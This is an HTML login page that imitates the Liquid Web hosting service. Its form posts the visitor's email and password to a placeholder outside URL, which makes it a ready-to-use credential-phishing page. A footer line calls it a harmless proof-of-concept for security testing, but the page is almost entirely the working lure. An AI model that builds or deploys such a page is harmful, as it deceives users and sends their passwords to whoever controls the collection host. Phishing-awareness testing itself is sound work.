<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Liquid Web Login</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="login-box">
    <h2>Login to Liquid Web</h2>
    <form action="https://YOUR_SSRF_ADVISOR_URL_HERE" method="POST">
      <label for="email">Email</label>
      <input type="email" name="email" required>

      <label for="password">Password</label>
      <input type="password" name="password" required>

      <button type="submit">Login</button>
    </form>
    <p class="disclaimer">This is a harmless PoC demo for security testing only.</p>
  </div>
</body>
</html>
